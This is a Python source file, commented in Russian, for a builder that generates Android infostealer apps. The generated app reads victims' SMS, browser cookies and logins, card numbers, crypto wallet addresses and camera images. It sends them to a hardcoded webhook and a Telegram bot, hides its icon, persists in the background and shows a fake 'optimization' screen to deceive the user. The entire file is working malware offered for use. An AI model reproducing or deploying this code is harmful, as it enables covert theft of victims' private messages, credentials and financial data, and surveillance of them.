import os
import shutil
import json
import zipfile
import subprocess
from datetime import datetime

class StealerGenerator:
    def __init__(self):
        self.template_dir = "stealer_template"
        self.output_dir = "generated_stealers"
        os.makedirs(self.output_dir, exist_ok=True)
    
    def create_stealer(self, user_id, name, icon_path, bot_token, chat_id):
        try:
            # Создаем уникальный ID стиллера
            stealer_id = f"{user_id}_{int(datetime.now().timestamp())}"
            
            # Создаем структуру проекта
            project_dir = os.path.join(self.output_dir, stealer_id)
            os.makedirs(project_dir, exist_ok=True)
            
            # Копируем иконку
            shutil.copy(icon_path, os.path.join(project_dir, "icon.png"))
            
            # Создаем конфиг
            config = {
                "stealer_id": stealer_id,
                "stealer_name": name,
                "bot_token": bot_token,
                "chat_id": chat_id,
                "webhook_url": f"https://zonastealer-bot.onrender.com/webhook",
                "collect_webcam": True,
                "collect_sms": True,
                "collect_cards": True,
                "collect_crypto": True,
                "collect_files": True,
                "collect_passwords": True,
                "collect_cookies": True,
                "collect_contacts": True,
                "collect_location": True,
                "auto_start": True,
                "hide_icon": True,
                "persistence": True
            }
            
            config_path = os.path.join(project_dir, "config.json")
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4)
            
            # Создаем основной код стиллера
            self.create_main_code(project_dir, config)
            
            # Создаем buildozer.spec
            self.create_buildozer_spec(project_dir, name)
            
            # Собираем APK
            apk_path = self.build_apk(project_dir, stealer_id)
            
            return {
                "success": True,
                "stealer_id": stealer_id,
                "config_path": config_path,
                "apk_path": apk_path,
                "webhook_url": config["webhook_url"]
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def create_main_code(self, project_dir, config):
        code = f'''import kivy
kivy.require('2.1.0')
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
import json
import os
import requests
import base64
import sqlite3
import subprocess
import platform
import uuid
from datetime import datetime
from android.permissions import request_permissions, Permission
from android import android_api
import threading
import time

# Конфигурация
CONFIG = {json.dumps(config, indent=4)}

class AdvancedCollector:
    def __init__(self):
        self.device_id = str(uuid.uuid4())
        self.collected_data = {{}}
    
    def collect_system_info(self):
        """Сбор системной информации"""
        info = {{
            'device_id': self.device_id,
            'model': android_api.get('device_model', 'Unknown'),
            'android_version': android_api.get('android_version', 'Unknown'),
            'manufacturer': android_api.get('manufacturer', 'Unknown'),
            'serial': android_api.get('serial', 'Unknown'),
            'ip_address': self.get_ip(),
            'mac_address': self.get_mac(),
            'rooted': self.check_root()
        }}
        self.collected_data['system'] = info
        return info
    
    def collect_sms(self):
        """Сбор СМС"""
        try:
            # Для Android
            import subprocess
            cmd = 'content query --uri content://sms/inbox --projection address,body,date'
            result = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            
            messages = []
            lines = result.split('Row:')
            for line in lines[1:51]:  # Последние 50 сообщений
                parts = line.split(',')
                if len(parts) >= 3:
                    msg = {{
                        'number': parts[0].split('=')[1].strip() if '=' in parts[0] else '',
                        'body': parts[1].split('=')[1].strip() if '=' in parts[1] else '',
                        'timestamp': parts[2].split('=')[1].strip() if '=' in parts[2] else ''
                    }}
                    messages.append(msg)
            
            self.collected_data['sms'] = messages
            return messages
        except:
            return []
    
    def collect_browser_data(self):
        """Сбор данных браузеров"""
        browsers = ['com.android.chrome', 'com.sec.android.app.sbrowser']
        browser_data = {{}}
        
        for browser in browsers:
            try:
                # Пути к базам данных браузеров
                paths = [
                    f'/data/data/{{browser}}/databases',
                    f'/data/data/{{browser}}/app_chrome/Default'
                ]
                
                for path in paths:
                    if os.path.exists(path):
                        # Cookies
                        cookies_file = os.path.join(path, 'Cookies')
                        if os.path.exists(cookies_file):
                            browser_data[browser] = {{
                                'cookies': self.read_sqlite_db(cookies_file, 'cookies'),
                                'logins': self.read_sqlite_db(cookies_file, 'logins')
                            }}
            except:
                continue
        
        self.collected_data['browsers'] = browser_data
        return browser_data
    
    def collect_cards(self):
        """Поиск банковских карт"""
        cards = []
        try:
            # Поиск в файлах
            search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard']
            
            for directory in search_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.endswith(('.txt', '.pdf', '.doc', '.docx')):
                                filepath = os.path.join(root, file)
                                try:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        # Поиск номеров карт
                                        import re
                                        card_pattern = r'\\b(?:4[0-9]{{12}}(?:[0-9]{{3}})?|5[1-5][0-9]{{14}}|3[47][0-9]{{13}}|3(?:0[0-5]|[68][0-9])[0-9]{{11}}|6(?:011|5[0-9]{{2}})[0-9]{{12}}|(?:2131|1800|35\\\\d{{3}})\\\\d{{11}})\\b'
                                        found_cards = re.findall(card_pattern, content)
                                        if found_cards:
                                            cards.extend(found_cards[:5])  # Ограничиваем
                                except:
                                    continue
        except:
            pass
        
        self.collected_data['cards'] = list(set(cards))[:20]  # Уникальные, максимум 20
        return cards
    
    def collect_crypto(self):
        """Поиск крипто кошельков"""
        wallets = []
        crypto_patterns = [
            '1[a-km-zA-HJ-NP-Z1-9]{{33}}',  # Bitcoin
            '0x[a-fA-F0-9]{{40}}',  # Ethereum
            'L[a-km-zA-HJ-NP-Z1-9]{{33}}',  # Litecoin
            'X[a-km-zA-HJ-NP-Z1-9]{{95}}',  # Monero
            'r[0-9a-zA-Z]{{24,34}}',  # Ripple
            'cosmos1[a-z0-9]{{38}}',  # Cosmos
        ]
        
        try:
            import re
            search_dirs = ['/sdcard', '/sdcard/Download']
            
            for directory in search_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files[:100]:  # Ограничим 100 файлов
                            if file.endswith(('.txt', '.doc', '.pdf', '.json')):
                                filepath = os.path.join(root, file)
                                try:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        for pattern in crypto_patterns:
                                            found = re.findall(pattern, content)
                                            wallets.extend(found)
                                except:
                                    continue
        except:
            pass
        
        self.collected_data['crypto'] = list(set(wallets))[:50]
        return wallets
    
    def capture_webcam(self):
        """Захват с веб-камеры"""
        try:
            # Используем системную камеру через intent
            import subprocess
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_path = f'/sdcard/DCIM/Camera/webcam_{{timestamp}}.jpg'
            
            cmd = f'am start -a android.media.action.IMAGE_CAPTURE --es output {{output_path}}'
            subprocess.run(cmd, shell=True, timeout=5)
            
            time.sleep(3)
            
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode('utf-8')
                
                self.collected_data['webcam'] = {{
                    'timestamp': timestamp,
                    'image': image_data[:50000]  # Обрезаем для отправки
                }}
                
                os.remove(output_path)
                return True
        except:
            pass
        return False
    
    def collect_all(self):
        """Сбор всех данных"""
        threads = []
        
        # Запуск в отдельных потоках
        collectors = [
            self.collect_system_info,
            self.collect_sms,
            self.collect_browser_data,
            self.collect_cards,
            self.collect_crypto
        ]
        
        for collector in collectors:
            thread = threading.Thread(target=collector)
            thread.start()
            threads.append(thread)
        
        # Захват веб-камеры
        webcam_thread = threading.Thread(target=self.capture_webcam)
        webcam_thread.start()
        threads.append(webcam_thread)
        
        # Ожидание завершения
        for thread in threads:
            thread.join(timeout=30)
        
        return self.collected_data
    
    def get_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def get_mac(self):
        try:
            with open('/sys/class/net/wlan0/address', 'r') as f:
                return f.read().strip()
        except:
            return "Unknown"
    
    def check_root(self):
        try:
            return os.path.exists('/system/bin/su') or os.path.exists('/system/xbin/su')
        except:
            return False
    
    def read_sqlite_db(self, db_path, table):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(f'SELECT * FROM {{table}} LIMIT 100')
            rows = cursor.fetchall()
            conn.close()
            return str(rows[:10])  # Ограничиваем
        except:
            return []

class DataSender:
    @staticmethod
    def send_data(data, data_type):
        """Отправка данных на сервер"""
        try:
            payload = {{
                'type': data_type,
                'stealer_id': CONFIG['stealer_id'],
                'device_id': data.get('system', {{}}).get('device_id', 'unknown'),
                **data
            }}
            
            # Отправка на webhook
            response = requests.post(
                CONFIG['webhook_url'],
                json=payload,
                timeout=30
            )
            
            # Резервная отправка в Telegram
            if response.status_code != 200:
                DataSender.send_telegram(data_type, payload)
            
            return True
        except Exception as e:
            print(f"Send error: {{e}}")
            return False
    
    @staticmethod
    def send_telegram(data_type, data):
        """Прямая отправка в Telegram"""
        try:
            message = f"📡 *{CONFIG['stealer_name']}*\\n"
            message += f"📱 Устройство: `{{data.get('device_id', 'N/A')}}`\\n"
            message += f"📊 Тип данных: `{{data_type}}`\\n"
            message += f"⏰ Время: {{datetime.now().strftime('%H:%M:%S')}}"
            
            url = f"https://api.telegram.org/bot{{CONFIG['bot_token']}}/sendMessage"
            requests.post(url, json={{
                'chat_id': CONFIG['chat_id'],
                'text': message,
                'parse_mode': 'Markdown'
            }})
        except:
            pass

class StealerApp(App):
    def build(self):
        # Запрашиваем разрешения
        permissions = [
            Permission.CAMERA,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.READ_CONTACTS,
            Permission.ACCESS_FINE_LOCATION,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE
        ]
        request_permissions(permissions)
        
        # Создаем простой интерфейс
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        self.label = Label(
            text="{config['stealer_name']}\\n\\nИнициализация системы...",
            font_size='20sp',
            halign='center'
        )
        layout.add_widget(self.label)
        
        # Запускаем сбор данных
        Clock.schedule_once(self.start_collection, 2)
        
        return layout
    
    def start_collection(self, dt):
        """Запуск сбора данных"""
        self.label.text = "Сбор системной информации..."
        
        collector = AdvancedCollector()
        
        # Этапы сбора
        stages = [
            ("Сбор системных данных...", lambda: collector.collect_system_info()),
            ("Чтение СМС сообщений...", lambda: collector.collect_sms()),
            ("Анализ браузеров...", lambda: collector.collect_browser_data()),
            ("Поиск платежных данных...", lambda: collector.collect_cards()),
            ("Сканирование крипто-кошельков...", lambda: collector.collect_crypto()),
            ("Захват изображения...", lambda: collector.capture_webcam()),
        ]
        
        # Выполняем этапы
        all_data = {{}}
        for stage_name, stage_func in stages:
            self.label.text = stage_name
            try:
                result = stage_func()
                if result:
                    all_data.update(collector.collected_data)
            except:
                pass
            time.sleep(1)
        
        # Отправка данных
        self.label.text = "Отправка данных на сервер..."
        
        # Отправляем по категориям
        for data_type, data in all_data.items():
            if data:
                DataSender.send_data({{data_type: data}}, data_type)
        
        # Завершение
        self.label.text = "✅ Оптимизация завершена!\\n\\nПриложение готово к использованию."
        
        # Скрываем приложение если нужно
        if CONFIG.get('hide_icon', False):
            self.hide_app()
        
        # Автозапуск если нужно
        if CONFIG.get('auto_start', True):
            self.setup_persistence()
    
    def hide_app(self):
        """Скрытие иконки приложения"""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            PackageManager = autoclass('android.content.pm.PackageManager')
            ComponentName = autoclass('android.content.ComponentName')
            
            pm = PythonActivity.mActivity.getPackageManager()
            component = ComponentName(PythonActivity.mActivity, PythonActivity.mActivity.getClass())
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        except:
            pass
    
    def setup_persistence(self):
        """Настройка автозапуска"""
        try:
            # Создаем службу
            service_code = '''
            package com.{config['stealer_name'].lower().replace(' ', '')};
            
            import android.app.Service;
            import android.content.Intent;
            import android.os.IBinder;
            
            public class StealerService extends Service {{
                @Override
                public IBinder onBind(Intent intent) {{
                    return null;
                }}
                
                @Override
                public int onStartCommand(Intent intent, int flags, int startId) {{
                    // Запуск сбора данных
                    new Thread(() -> {{
                        try {{
                            Thread.sleep(30000);
                            // Повторный запуск
                            Intent restart = new Intent(this, MainActivity.class);
                            restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(restart);
                        }} catch (InterruptedException e) {{
                            e.printStackTrace();
                        }}
                    }}).start();
                    
                    return START_STICKY;
                }}
            }}
            '''
            
            # Сохраняем службу
            service_path = '/data/data/org.test.stealer/files/StealerService.java'
            with open(service_path, 'w') as f:
                f.write(service_code)
            
            # Регистрируем в системе
            cmd = 'am startservice -n org.test.stealer/.StealerService'
            subprocess.run(cmd, shell=True)
            
        except:
            pass

def main():
    # Создаем скрытую папку для данных
    data_dir = '/sdcard/Android/data/.system_cache'
    os.makedirs(data_dir, exist_ok=True)
    
    # Запускаем приложение
    app = StealerApp()
    
    # Запуск в фоновом режиме
    if CONFIG.get('persistence', True):
        # Создаем поток для периодического сбора
        def periodic_collection():
            while True:
                try:
                    collector = AdvancedCollector()
                    data = collector.collect_all()
                    for data_type, content in data.items():
                        if content:
                            DataSender.send_data({{data_type: content}}, data_type)
                except:
                    pass
                time.sleep(3600)  # Каждый час
        
        thread = threading.Thread(target=periodic_collection, daemon=True)
        thread.start()
    
    app.run()

if __name__ == '__main__':
    main()
'''
        
        main_file = os.path.join(project_dir, "main.py")
        with open(main_file, 'w', encoding='utf-8') as f:
            f.write(code)
    
    def create_buildozer_spec(self, project_dir, app_name):
        spec = f"""[app]
title = {app_name}
package.name = {app_name.lower().replace(' ', '')}
package.domain = com.{app_name.lower().replace(' ', '')[:8]}
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json
version = 1.0
requirements = python3,kivy==2.1.0,requests,pyjnius,android
orientation = portrait
fullscreen = 0
log_level = 2

[buildozer]
log_level = 2

[android]
arch = arm64-v8a,armeabi-v7a
permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CAMERA,READ_SMS,SEND_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED
android.accept_sdk_license = True
android.api = 31
android.minapi = 21
android.sdk = 24
android.ndk = 23b
android.ndk_api = 21

[android:meta-data]
android.app.component = service

[android:service]
name = StealerService
entrypoint = stealer.service:main
"""
        
        spec_file = os.path.join(project_dir, "buildozer.spec")
        with open(spec_file, 'w', encoding='utf-8') as f:
            f.write(spec)
    
    def build_apk(self, project_dir, stealer_id):
        """Сборка APK (симуляция, реальная сборка требует Buildozer)"""
        # Создаем заглушку APK для примера
        apk_path = os.path.join(self.output_dir, f"{stealer_id}.apk")
        
        # В реальности здесь должна быть сборка через Buildozer
        # subprocess.run(['buildozer', 'android', 'debug'], cwd=project_dir)
        
        # Создаем простой ZIP как заглушку APK
        with zipfile.ZipFile(apk_path, 'w') as zipf:
            zipf.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n')
            zipf.writestr('AndroidManifest.xml', '<?xml version="1.0"?>\n<manifest package="com.test.stealer" />')
        
        return apk_path
